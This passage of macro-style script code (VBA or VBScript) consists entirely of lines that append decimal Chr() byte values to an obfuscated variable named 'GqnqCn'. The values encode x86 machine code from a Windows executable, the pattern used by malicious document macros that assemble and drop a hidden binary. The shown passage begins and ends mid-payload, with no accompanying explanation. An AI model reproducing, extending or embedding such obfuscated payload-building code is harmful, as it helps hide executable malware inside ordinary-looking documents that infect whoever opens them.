GqnqCn=GqnqCn&Chr(67)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(195)&Chr(16)&Chr(255)&Chr(77)&Chr(8)&Chr(117)&Chr(214)&Chr(139)&Chr(135)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(214)&Chr(94)&Chr(91)&Chr(139)&Chr(199)&Chr(95)&Chr(93)&Chr(195)&Chr(133)&Chr(255)&Chr(116)&Chr(55)&Chr(133)&Chr(192)&Chr(116)&Chr(51)&Chr(86)&Chr(139)&Chr(48)&Chr(59)&Chr(247)&Chr(116)&Chr(40)&Chr(87)&Chr(137)&Chr(56)&Chr(232)&Chr(193)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(246)&Chr(116)&Chr(27)&Chr(86)&Chr(232)&Chr(69)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(62)&Chr(0)&Chr(89)&Chr(117)&Chr(15)&Chr(129)&Chr(254)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(89)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(199)&Chr(94)&Chr(195)&Chr(51)&Chr(192)&Chr(195)
GqnqCn=GqnqCn&Chr(106)&Chr(12)&Chr(104)&Chr(168)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(8)&Chr(225)&Chr(255)&Chr(255)&Chr(232)&Chr(252)&Chr(221)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(161)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(70)&Chr(112)&Chr(116)&Chr(34)&Chr(131)&Chr(126)&Chr(108)&Chr(0)&Chr(116)&Chr(28)&Chr(232)&Chr(229)&Chr(221)&Chr(255)&Chr(255)&Chr(139)&Chr(112)&Chr(108)&Chr(133)&Chr(246)&Chr(117)&Chr(8)&Chr(106)&Chr(32)&Chr(232)&Chr(90)&Chr(205)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(232)&Chr(27)&Chr(225)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(12)&Chr(232)&Chr(30)&Chr(229)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(141)&Chr(70)&Chr(108)&Chr(139)&Chr(61)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(232)&Chr(105)&Chr(255)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)
GqnqCn=GqnqCn&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(193)&Chr(106)&Chr(12)&Chr(232)&Chr(25)&Chr(228)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(117)&Chr(228)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(13)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(161)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(107)&Chr(201)&Chr(20)&Chr(3)&Chr(200)&Chr(235)&Chr(17)&Chr(139)&Chr(85)&Chr(8)&Chr(43)&Chr(80)&Chr(12)&Chr(129)&Chr(250)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(114)&Chr(9)&Chr(131)&Chr(192)&Chr(20)&Chr(59)&Chr(193)&Chr(114)&Chr(235)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(65)&Chr(16)&Chr(86)&Chr(139)&Chr(117)&Chr(12)&Chr(87)&Chr(139)&Chr(254)&Chr(43)&Chr(121)&Chr(12)&Chr(131)&Chr(198)&Chr(252)&Chr(193)&Chr(239)&Chr(15)&Chr(139)&Chr(207)&Chr(105)&Chr(201)
GqnqCn=GqnqCn&Chr(4)&Chr(2)&Chr(0)&Chr(0)&Chr(141)&Chr(140)&Chr(1)&Chr(68)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(77)&Chr(240)&Chr(139)&Chr(14)&Chr(73)&Chr(137)&Chr(77)&Chr(252)&Chr(246)&Chr(193)&Chr(1)&Chr(15)&Chr(133)&Chr(211)&Chr(2)&Chr(0)&Chr(0)&Chr(83)&Chr(141)&Chr(28)&Chr(49)&Chr(139)&Chr(19)&Chr(137)&Chr(85)&Chr(244)&Chr(139)&Chr(86)&Chr(252)&Chr(137)&Chr(85)&Chr(248)&Chr(139)&Chr(85)&Chr(244)&Chr(137)&Chr(93)&Chr(12)&Chr(246)&Chr(194)&Chr(1)&Chr(117)&Chr(116)&Chr(193)&Chr(250)&Chr(4)&Chr(74)&Chr(131)&Chr(250)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(90)&Chr(139)&Chr(75)&Chr(4)&Chr(59)&Chr(75)&Chr(8)&Chr(117)&Chr(66)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(250)&Chr(32)&Chr(115)&Chr(25)&Chr(139)&Chr(202)&Chr(211)&Chr(235)&Chr(141)&Chr(76)&Chr(2)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(92)&Chr(184)&Chr(68)&Chr(254)
GqnqCn=GqnqCn&Chr(9)&Chr(117)&Chr(35)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(25)&Chr(235)&Chr(28)&Chr(141)&Chr(74)&Chr(224)&Chr(211)&Chr(235)&Chr(141)&Chr(76)&Chr(2)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(156)&Chr(184)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(9)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(89)&Chr(4)&Chr(139)&Chr(93)&Chr(12)&Chr(139)&Chr(83)&Chr(8)&Chr(139)&Chr(91)&Chr(4)&Chr(139)&Chr(77)&Chr(252)&Chr(3)&Chr(77)&Chr(244)&Chr(137)&Chr(90)&Chr(4)&Chr(139)&Chr(85)&Chr(12)&Chr(139)&Chr(90)&Chr(4)&Chr(139)&Chr(82)&Chr(8)&Chr(137)&Chr(83)&Chr(8)&Chr(137)&Chr(77)&Chr(252)&Chr(139)&Chr(209)&Chr(193)&Chr(250)&Chr(4)&Chr(74)&Chr(131)&Chr(250)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(90)&Chr(139)&Chr(93)&Chr(248)&Chr(131)&Chr(227)&Chr(1)&Chr(137)&Chr(93)&Chr(244)&Chr(15)&Chr(133)&Chr(143)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(43)&Chr(117)&Chr(248)&Chr(139)&Chr(93)&Chr(248)&Chr(193)&Chr(251)&Chr(4)&Chr(106)&Chr(63)&Chr(137)&Chr(117)&Chr(12)&Chr(75)&Chr(94)&Chr(59)&Chr(222)&Chr(118)&Chr(2)&Chr(139)&Chr(222)&Chr(3)&Chr(77)&Chr(248)&Chr(139)&Chr(209)&Chr(193)&Chr(250)&Chr(4)&Chr(74)&Chr(137)&Chr(77)&Chr(252)&Chr(59)&Chr(214)&Chr(118)&Chr(2)&Chr(139)&Chr(214)&Chr(59)&Chr(218)&Chr(116)&Chr(94)&Chr(139)&Chr(77)&Chr(12)&Chr(139)&Chr(113)&Chr(4)&Chr(59)&Chr(113)&Chr(8)&Chr(117)&Chr(59)&Chr(190)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(251)&Chr(32)&Chr(115)&Chr(23)&Chr(139)&Chr(203)&Chr(211)&Chr(238)&Chr(247)&Chr(214)&Chr(33)&Chr(116)&Chr(184)&Chr(68)&Chr(254)&Chr(76)&Chr(3)&Chr(4)&Chr(117)&Chr(33)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(49)&Chr(235)&Chr(26)&Chr(141)&Chr(75)&Chr(224)&Chr(211)&Chr(238)&Chr(247)&Chr(214)&Chr(33)&Chr(180)&Chr(184)&Chr(196)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(254)&Chr(76)&Chr(3)&Chr(4)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(113)&Chr(4)&Chr(139)&Chr(77)&Chr(12)&Chr(139)&Chr(113)&Chr(8)&Chr(139)&Chr(73)&Chr(4)&Chr(137)&Chr(78)&Chr(4)&Chr(139)&Chr(77)&Chr(12)&Chr(139)&Chr(113)&Chr(4)&Chr(139)&Chr(73)&Chr(8)&Chr(137)&Chr(78)&Chr(8)&Chr(139)&Chr(117)&Chr(12)&Chr(235)&Chr(3)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(125)&Chr(244)&Chr(0)&Chr(117)&Chr(8)&Chr(59)&Chr(218)&Chr(15)&Chr(132)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(240)&Chr(141)&Chr(12)&Chr(209)&Chr(139)&Chr(89)&Chr(4)&Chr(137)&Chr(78)&Chr(8)&Chr(137)&Chr(94)&Chr(4)&Chr(137)&Chr(113)&Chr(4)&Chr(139)&Chr(78)&Chr(4)&Chr(137)&Chr(113)&Chr(8)&Chr(139)&Chr(78)&Chr(4)&Chr(59)&Chr(78)&Chr(8)&Chr(117)&Chr(96)&Chr(138)&Chr(76)&Chr(2)&Chr(4)&Chr(136)&Chr(77)&Chr(15)&Chr(254)
GqnqCn=GqnqCn&Chr(193)&Chr(136)&Chr(76)&Chr(2)&Chr(4)&Chr(131)&Chr(250)&Chr(32)&Chr(115)&Chr(37)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(14)&Chr(139)&Chr(202)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(25)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(139)&Chr(202)&Chr(211)&Chr(235)&Chr(141)&Chr(68)&Chr(184)&Chr(68)&Chr(9)&Chr(24)&Chr(235)&Chr(41)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(16)&Chr(141)&Chr(74)&Chr(224)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(89)&Chr(4)&Chr(141)&Chr(74)&Chr(224)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(141)&Chr(132)&Chr(184)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(16)&Chr(139)&Chr(69)&Chr(252)&Chr(137)&Chr(6)&Chr(137)&Chr(68)&Chr(48)&Chr(252)&Chr(139)&Chr(69)&Chr(240)
GqnqCn=GqnqCn&Chr(255)&Chr(8)&Chr(15)&Chr(133)&Chr(243)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(216)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(53)&Chr(112)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(193)&Chr(225)&Chr(15)&Chr(3)&Chr(72)&Chr(12)&Chr(187)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(83)&Chr(81)&Chr(255)&Chr(214)&Chr(139)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(9)&Chr(80)&Chr(8)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(64)&Chr(16)&Chr(139)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(164)&Chr(136)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)
GqnqCn=GqnqCn&Chr(0)&Chr(139)&Chr(64)&Chr(16)&Chr(254)&Chr(72)&Chr(67)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(72)&Chr(16)&Chr(128)&Chr(121)&Chr(67)&Chr(0)&Chr(117)&Chr(9)&Chr(131)&Chr(96)&Chr(4)&Chr(254)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(120)&Chr(8)&Chr(255)&Chr(117)&Chr(101)&Chr(83)&Chr(106)&Chr(0)&Chr(255)&Chr(112)&Chr(12)&Chr(255)&Chr(214)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(112)&Chr(16)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(116)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(13)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(107)&Chr(201)&Chr(20)&Chr(139)&Chr(21)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(43)&Chr(200)&Chr(141)&Chr(76)&Chr(17)&Chr(236)&Chr(81)&Chr(141)&Chr(72)&Chr(20)&Chr(81)&Chr(80)&Chr(232)&Chr(117)
GqnqCn=GqnqCn&Chr(27)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(131)&Chr(196)&Chr(12)&Chr(255)&Chr(13)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(59)&Chr(5)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(4)&Chr(131)&Chr(109)&Chr(8)&Chr(20)&Chr(161)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(163)&Chr(188)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(137)&Chr(61)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(91)&Chr(95)&Chr(94)&Chr(201)&Chr(195)&Chr(161)&Chr(192)&Chr(182)&Chr(64)&Chr(0)&Chr(86)&Chr(139)&Chr(53)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(87)&Chr(51)&Chr(255)&Chr(59)&Chr(240)&Chr(117)&Chr(52)&Chr(131)&Chr(192)&Chr(16)&Chr(107)&Chr(192)&Chr(20)&Chr(80)&Chr(255)&Chr(53)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(192)&Chr(128)&Chr(64)
GqnqCn=GqnqCn&Chr(0)&Chr(59)&Chr(199)&Chr(117)&Chr(4)&Chr(51)&Chr(192)&Chr(235)&Chr(120)&Chr(131)&Chr(5)&Chr(192)&Chr(182)&Chr(64)&Chr(0)&Chr(16)&Chr(139)&Chr(53)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(163)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(107)&Chr(246)&Chr(20)&Chr(3)&Chr(53)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(104)&Chr(196)&Chr(65)&Chr(0)&Chr(0)&Chr(106)&Chr(8)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(70)&Chr(16)&Chr(59)&Chr(199)&Chr(116)&Chr(199)&Chr(106)&Chr(4)&Chr(104)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(104)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(87)&Chr(255)&Chr(21)&Chr(188)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(70)&Chr(12)&Chr(59)&Chr(199)&Chr(117)&Chr(18)&Chr(255)&Chr(118)&Chr(16)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)
GqnqCn=GqnqCn&Chr(116)&Chr(128)&Chr(64)&Chr(0)&Chr(235)&Chr(155)&Chr(131)&Chr(78)&Chr(8)&Chr(255)&Chr(137)&Chr(62)&Chr(137)&Chr(126)&Chr(4)&Chr(255)&Chr(5)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(70)&Chr(16)&Chr(131)&Chr(8)&Chr(255)&Chr(139)&Chr(198)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(65)&Chr(8)&Chr(83)&Chr(86)&Chr(139)&Chr(113)&Chr(16)&Chr(87)&Chr(51)&Chr(219)&Chr(235)&Chr(3)&Chr(3)&Chr(192)&Chr(67)&Chr(133)&Chr(192)&Chr(125)&Chr(249)&Chr(139)&Chr(195)&Chr(105)&Chr(192)&Chr(4)&Chr(2)&Chr(0)&Chr(0)&Chr(141)&Chr(132)&Chr(48)&Chr(68)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(63)&Chr(137)&Chr(69)&Chr(248)&Chr(90)&Chr(137)&Chr(64)&Chr(8)&Chr(137)&Chr(64)&Chr(4)&Chr(131)&Chr(192)&Chr(8)&Chr(74)&Chr(117)&Chr(244)&Chr(106)&Chr(4)&Chr(139)&Chr(251)&Chr(104)
GqnqCn=GqnqCn&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(193)&Chr(231)&Chr(15)&Chr(3)&Chr(121)&Chr(12)&Chr(104)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(87)&Chr(255)&Chr(21)&Chr(188)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(131)&Chr(200)&Chr(255)&Chr(233)&Chr(157)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(151)&Chr(0)&Chr(112)&Chr(0)&Chr(0)&Chr(137)&Chr(85)&Chr(252)&Chr(59)&Chr(250)&Chr(119)&Chr(67)&Chr(139)&Chr(202)&Chr(43)&Chr(207)&Chr(193)&Chr(233)&Chr(12)&Chr(141)&Chr(71)&Chr(16)&Chr(65)&Chr(131)&Chr(72)&Chr(248)&Chr(255)&Chr(131)&Chr(136)&Chr(236)&Chr(15)&Chr(0)&Chr(0)&Chr(255)&Chr(141)&Chr(144)&Chr(252)&Chr(15)&Chr(0)&Chr(0)&Chr(137)&Chr(16)&Chr(141)&Chr(144)&Chr(252)&Chr(239)&Chr(255)&Chr(255)&Chr(199)&Chr(64)&Chr(252)&Chr(240)&Chr(15)&Chr(0)&Chr(0)&Chr(137)&Chr(80)&Chr(4)&Chr(199)&Chr(128)&Chr(232)&Chr(15)&Chr(0)&Chr(0)&Chr(240)
GqnqCn=GqnqCn&Chr(15)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(73)&Chr(117)&Chr(203)&Chr(139)&Chr(85)&Chr(252)&Chr(139)&Chr(69)&Chr(248)&Chr(5)&Chr(248)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(79)&Chr(12)&Chr(137)&Chr(72)&Chr(4)&Chr(137)&Chr(65)&Chr(8)&Chr(141)&Chr(74)&Chr(12)&Chr(137)&Chr(72)&Chr(8)&Chr(137)&Chr(65)&Chr(4)&Chr(131)&Chr(100)&Chr(158)&Chr(68)&Chr(0)&Chr(51)&Chr(255)&Chr(71)&Chr(137)&Chr(188)&Chr(158)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(138)&Chr(70)&Chr(67)&Chr(138)&Chr(200)&Chr(254)&Chr(193)&Chr(132)&Chr(192)&Chr(139)&Chr(69)&Chr(8)&Chr(136)&Chr(78)&Chr(67)&Chr(117)&Chr(3)&Chr(9)&Chr(120)&Chr(4)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(139)&Chr(203)&Chr(211)&Chr(234)&Chr(247)&Chr(210)&Chr(33)&Chr(80)&Chr(8)&Chr(139)&Chr(195)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)
GqnqCn=GqnqCn&Chr(236)&Chr(131)&Chr(236)&Chr(12)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(65)&Chr(16)&Chr(83)&Chr(86)&Chr(139)&Chr(117)&Chr(16)&Chr(87)&Chr(139)&Chr(125)&Chr(12)&Chr(139)&Chr(215)&Chr(43)&Chr(81)&Chr(12)&Chr(131)&Chr(198)&Chr(23)&Chr(193)&Chr(234)&Chr(15)&Chr(139)&Chr(202)&Chr(105)&Chr(201)&Chr(4)&Chr(2)&Chr(0)&Chr(0)&Chr(141)&Chr(140)&Chr(1)&Chr(68)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(77)&Chr(244)&Chr(139)&Chr(79)&Chr(252)&Chr(131)&Chr(230)&Chr(240)&Chr(73)&Chr(59)&Chr(241)&Chr(141)&Chr(124)&Chr(57)&Chr(252)&Chr(139)&Chr(31)&Chr(137)&Chr(77)&Chr(16)&Chr(137)&Chr(93)&Chr(252)&Chr(15)&Chr(142)&Chr(85)&Chr(1)&Chr(0)&Chr(0)&Chr(246)&Chr(195)&Chr(1)&Chr(15)&Chr(133)&Chr(69)&Chr(1)&Chr(0)&Chr(0)&Chr(3)&Chr(217)&Chr(59)&Chr(243)&Chr(15)&Chr(143)&Chr(59)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(252)&Chr(193)&Chr(249)&Chr(4)
GqnqCn=GqnqCn&Chr(73)&Chr(137)&Chr(77)&Chr(248)&Chr(131)&Chr(249)&Chr(63)&Chr(118)&Chr(6)&Chr(106)&Chr(63)&Chr(89)&Chr(137)&Chr(77)&Chr(248)&Chr(139)&Chr(95)&Chr(4)&Chr(59)&Chr(95)&Chr(8)&Chr(117)&Chr(67)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(249)&Chr(32)&Chr(115)&Chr(26)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(248)&Chr(141)&Chr(76)&Chr(1)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(92)&Chr(144)&Chr(68)&Chr(254)&Chr(9)&Chr(117)&Chr(38)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(25)&Chr(235)&Chr(31)&Chr(131)&Chr(193)&Chr(224)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(248)&Chr(141)&Chr(76)&Chr(1)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(156)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(9)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(89)&Chr(4)&Chr(139)&Chr(79)&Chr(8)&Chr(139)&Chr(95)&Chr(4)&Chr(137)&Chr(89)&Chr(4)&Chr(139)
GqnqCn=GqnqCn&Chr(79)&Chr(4)&Chr(139)&Chr(127)&Chr(8)&Chr(137)&Chr(121)&Chr(8)&Chr(139)&Chr(77)&Chr(16)&Chr(43)&Chr(206)&Chr(1)&Chr(77)&Chr(252)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(15)&Chr(142)&Chr(165)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(125)&Chr(252)&Chr(139)&Chr(77)&Chr(12)&Chr(193)&Chr(255)&Chr(4)&Chr(79)&Chr(141)&Chr(76)&Chr(49)&Chr(252)&Chr(131)&Chr(255)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(95)&Chr(139)&Chr(93)&Chr(244)&Chr(141)&Chr(28)&Chr(251)&Chr(137)&Chr(93)&Chr(16)&Chr(139)&Chr(91)&Chr(4)&Chr(137)&Chr(89)&Chr(4)&Chr(139)&Chr(93)&Chr(16)&Chr(137)&Chr(89)&Chr(8)&Chr(137)&Chr(75)&Chr(4)&Chr(139)&Chr(89)&Chr(4)&Chr(137)&Chr(75)&Chr(8)&Chr(139)&Chr(89)&Chr(4)&Chr(59)&Chr(89)&Chr(8)&Chr(117)&Chr(87)&Chr(138)&Chr(76)&Chr(7)&Chr(4)&Chr(136)&Chr(77)&Chr(19)&Chr(254)&Chr(193)&Chr(136)&Chr(76)&Chr(7)&Chr(4)&Chr(131)
GqnqCn=GqnqCn&Chr(255)&Chr(32)&Chr(115)&Chr(28)&Chr(128)&Chr(125)&Chr(19)&Chr(0)&Chr(117)&Chr(14)&Chr(139)&Chr(207)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(25)&Chr(141)&Chr(68)&Chr(144)&Chr(68)&Chr(139)&Chr(207)&Chr(235)&Chr(32)&Chr(128)&Chr(125)&Chr(19)&Chr(0)&Chr(117)&Chr(16)&Chr(141)&Chr(79)&Chr(224)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(89)&Chr(4)&Chr(141)&Chr(132)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(79)&Chr(224)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(9)&Chr(16)&Chr(139)&Chr(85)&Chr(12)&Chr(139)&Chr(77)&Chr(252)&Chr(141)&Chr(68)&Chr(50)&Chr(252)&Chr(137)&Chr(8)&Chr(137)&Chr(76)&Chr(1)&Chr(252)&Chr(235)&Chr(3)&Chr(139)&Chr(85)&Chr(12)&Chr(141)&Chr(70)&Chr(1)&Chr(137)&Chr(66)&Chr(252)
GqnqCn=GqnqCn&Chr(137)&Chr(68)&Chr(50)&Chr(248)&Chr(233)&Chr(60)&Chr(1)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(233)&Chr(56)&Chr(1)&Chr(0)&Chr(0)&Chr(15)&Chr(141)&Chr(47)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(93)&Chr(12)&Chr(41)&Chr(117)&Chr(16)&Chr(141)&Chr(78)&Chr(1)&Chr(137)&Chr(75)&Chr(252)&Chr(141)&Chr(92)&Chr(51)&Chr(252)&Chr(139)&Chr(117)&Chr(16)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(137)&Chr(93)&Chr(12)&Chr(137)&Chr(75)&Chr(252)&Chr(131)&Chr(254)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(246)&Chr(69)&Chr(252)&Chr(1)&Chr(15)&Chr(133)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(252)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(131)&Chr(254)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(139)&Chr(79)&Chr(4)&Chr(59)&Chr(79)&Chr(8)&Chr(117)&Chr(66)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(254)&Chr(32)
GqnqCn=GqnqCn&Chr(115)&Chr(25)&Chr(139)&Chr(206)&Chr(211)&Chr(235)&Chr(141)&Chr(116)&Chr(6)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(92)&Chr(144)&Chr(68)&Chr(254)&Chr(14)&Chr(117)&Chr(35)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(25)&Chr(235)&Chr(28)&Chr(141)&Chr(78)&Chr(224)&Chr(211)&Chr(235)&Chr(141)&Chr(76)&Chr(6)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(156)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(9)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(89)&Chr(4)&Chr(139)&Chr(93)&Chr(12)&Chr(139)&Chr(79)&Chr(8)&Chr(139)&Chr(119)&Chr(4)&Chr(137)&Chr(113)&Chr(4)&Chr(139)&Chr(119)&Chr(8)&Chr(139)&Chr(79)&Chr(4)&Chr(137)&Chr(113)&Chr(8)&Chr(139)&Chr(117)&Chr(16)&Chr(3)&Chr(117)&Chr(252)&Chr(137)&Chr(117)&Chr(16)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(131)&Chr(254)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(139)&Chr(77)&Chr(244)
